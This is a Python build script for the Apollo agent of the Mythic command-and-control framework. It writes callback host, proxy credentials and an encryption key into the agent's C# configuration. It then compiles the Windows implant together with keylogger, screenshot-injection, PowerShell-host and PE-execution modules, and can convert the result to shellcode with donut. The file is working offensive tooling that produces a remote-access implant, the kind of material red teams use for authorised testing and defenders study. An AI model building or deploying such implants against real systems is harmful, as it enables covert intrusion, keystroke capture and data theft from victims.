from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
import os, fnmatch, tempfile, sys, asyncio
from distutils.dir_util import copy_tree
import traceback
import shutil
import json
import pathlib
from mythic_container.MythicRPC import *


class Apollo(PayloadType):
    name = "apollo"
    file_extension = "exe"
    author = "@djhohnstein"
    mythic_encrypts = True
    supported_os = [
        SupportedOS.Windows
    ]
    version = "2.2.4"
    wrapper = False
    wrapped_payloads = ["scarecrow_wrapper", "service_wrapper"]
    note = """
A fully featured .NET 4.0 compatible training agent. Version: {}
    """.format(version)
    supports_dynamic_loading = True
    build_parameters = [
        BuildParameter(
            name = "output_type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=[ "WinExe", "Shellcode"],
            default_value="WinExe",
            description="Output as shellcode, executable, or dynamically loaded library.",
        )
    ]
    c2_profiles = ["http", "smb", "tcp"]
    agent_path = pathlib.Path(".") / "apollo" / "mythic"
    agent_code_path = pathlib.Path(".") / "apollo" / "agent_code"
    agent_icon_path = agent_path / "agent_functions" / "apollo.svg"
    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Copying files to temp location"),
        BuildStep(step_name="Compiling", step_description="Compiling with nuget and msbuild"),
        BuildStep(step_name="Donut", step_description="Converting to Shellcode"),
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Error)
        # debugging
        # resp.status = BuildStatus.Success
        # return resp
        #end debugging
        defines_commands_upper = [f"#define {x.upper()}" for x in self.commands.get_commands()]
        special_files_map = {
            "Config.cs": {
                "callback_interval": "",
                "callback_jitter": "",
                "callback_port": "",
                "callback_host": "",
                "post_uri": "",
                "proxy_host": "",
                "proxy_port": "",
                "proxy_user": "",
                "proxy_pass": "",
                # "domain_front": "",
                "killdate": "",
                # "USER_AGENT": "",
                "pipename": "",
                "port": "",
                "encrypted_exchange_check": "",
                "payload_uuid": self.uuid,
                "AESPSK": "",
            },
        }
        extra_variables = {

        }
        success_message = f"Apollo {self.uuid} Successfully Built"
        stdout_err = ""
        defines_profiles_upper = []
        for c2 in self.c2info:
            profile = c2.get_c2profile()
            defines_profiles_upper.append(f"#define {profile['name'].upper()}")
            for key, val in c2.get_parameters_dict().items():
                if isinstance(val, dict) and 'enc_key' in val:
                    stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
                    special_files_map["Config.cs"][key] = val["enc_key"] if val["enc_key"] is not None else ""
                elif isinstance(val, str):
                    special_files_map["Config.cs"][key] = val
                elif isinstance(val, bool):
                    special_files_map["Config.cs"][key] = "T" if val else "F"
                elif isinstance(val, dict):
                    extra_variables = {**extra_variables, **val}
                else:
                    special_files_map["Config.cs"][key] = json.dumps(val)
        try:
            # make a temp directory for it to live
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
            # shutil to copy payload files over
            copy_tree(str(self.agent_code_path), agent_build_path.name)
            # first replace everything in the c2 profiles
            for csFile in get_csharp_files(agent_build_path.name):
                templateFile = open(csFile, "rb").read().decode()
                templateFile = templateFile.replace("#define C2PROFILE_NAME_UPPER", "\n".join(defines_profiles_upper))
                templateFile = templateFile.replace("#define COMMAND_NAME_UPPER",  "\n".join(defines_commands_upper) )
                for specialFile in special_files_map.keys():
                    if csFile.endswith(specialFile):
                        for key, val in special_files_map[specialFile].items():
                            templateFile = templateFile.replace(key + "_here", val)
                        if specialFile == "Config.cs":
                            if len(extra_variables.keys()) > 0:
                                extra_data = ""
                                for key, val in extra_variables.items():
                                    extra_data += "                        { \"" + key + "\", \"" + val + "\" },\n"
                                templateFile = templateFile.replace("HTTP_ADDITIONAL_HEADERS_HERE", extra_data)
                            else:
                                templateFile = templateFile.replace("HTTP_ADDITIONAL_HEADERS_HERE", "")
                with open(csFile, "wb") as f:
                    f.write(templateFile.encode())
            command = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release -p:Platform=\"Any CPU\""
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
            ))
            proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
            stdout, stderr = await proc.communicate()
            if stdout:
                stdout_err += f'\n[stdout]\n{stdout.decode()}\n'
            if stderr:
                stdout_err += f'[stderr]\n{stderr.decode()}' + "\n" + command
            output_path = "{}/Apollo/bin/Release/Apollo.exe".format(agent_build_path.name)

            if os.path.exists(output_path):
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout="Successfully compiled payload",
                    StepSuccess=True
                ))
                resp.status = BuildStatus.Success
                targetExeAsmPath = "/srv/ExecuteAssembly.exe"
                targetPowerPickPath = "/srv/PowerShellHost.exe"
                targetScreenshotInjectPath = "/srv/ScreenshotInject.exe"
                targetKeylogInjectPath = "/srv/KeylogInject.exe"
                targetExecutePEPath = "/srv/ExecutePE.exe"
                targetInteropPath = "/srv/ApolloInterop.dll"
                shutil.move("{}/ExecuteAssembly/bin/Release/ExecuteAssembly.exe".format(agent_build_path.name), targetExeAsmPath)
                shutil.move("{}/PowerShellHost/bin/Release/PowerShellHost.exe".format(agent_build_path.name), targetPowerPickPath)
                shutil.move("{}/ScreenshotInject/bin/Release/ScreenshotInject.exe".format(agent_build_path.name), targetScreenshotInjectPath)
                shutil.move("{}/KeylogInject/bin/Release/KeylogInject.exe".format(agent_build_path.name), targetKeylogInjectPath)
                shutil.move("{}/ExecutePE/bin/Release/ExecutePE.exe".format(agent_build_path.name), targetExecutePEPath)
                shutil.move("{}/ApolloInterop/bin/Release/ApolloInterop.dll".format(agent_build_path.name), targetInteropPath)
                if self.get_parameter('output_type') != "Shellcode":
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Donut",
                        StepStdout="Not converting to Shellcode through donut, passing through.",
                        StepSuccess=True
                    ))
                    resp.payload = open(output_path, 'rb').read()
                    resp.build_message = success_message
                    resp.status = BuildStatus.Success
                    resp.build_stdout = stdout_err
                else:

                    shellcode_path = "{}/loader.bin".format(agent_build_path.name)
                    donutPath = os.path.abspath(self.agent_code_path / "donut")
                    command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
                    proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
                    stdout, stderr = await proc.communicate()

                    command = "{} -f 1 {}".format(donutPath, output_path)
                    # need to go through one more step to turn our exe into shellcode
                    proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                                 stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
                    stdout, stderr = await proc.communicate()

                    stdout_err += f'[stdout]\n{stdout.decode()}\n'
                    stdout_err += f'[stderr]\n{stderr.decode()}'

                    if not os.path.exists(shellcode_path):
                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Donut",
                            StepStdout=f"Failed to pass through donut:\n{command}\n{stdout_err}",
                            StepSuccess=False
                        ))
                        resp.build_message = "Failed to create shellcode"
                        resp.status = BuildStatus.Error
                        resp.payload = b""
                        resp.build_stderr = stdout_err
                    else:
                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Donut",
                            StepStdout=f"Successfully passed through donut:\n{command}",
                            StepSuccess=True
                        ))
                        resp.payload = open(shellcode_path, 'rb').read()
                        resp.build_message = success_message
                        resp.status = BuildStatus.Success
                        resp.build_stdout = stdout_err
            else:
                # something went wrong, return our errors
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout=stdout_err,
                    StepSuccess=False
                ))
                resp.status = BuildStatus.Error
                resp.payload = b""
                resp.build_message = "Unknown error while building payload. Check the stderr for this build."
                resp.build_stderr = stdout_err
        except Exception as e:
            resp.payload = b""
            resp.status = BuildStatus.Error
            resp.build_message = "Error building payload: " + str(traceback.format_exc())
        return resp


def get_csharp_files(base_path: str) -> list[str]:
    results = []
    for root, dirs, files in os.walk(base_path):
        for name in files:
            if fnmatch.fnmatch(name, "*.cs"):
                results.append(os.path.join(root, name))
    if len(results) == 0:
        raise Exception("No payload files found with extension .cs")
    return results
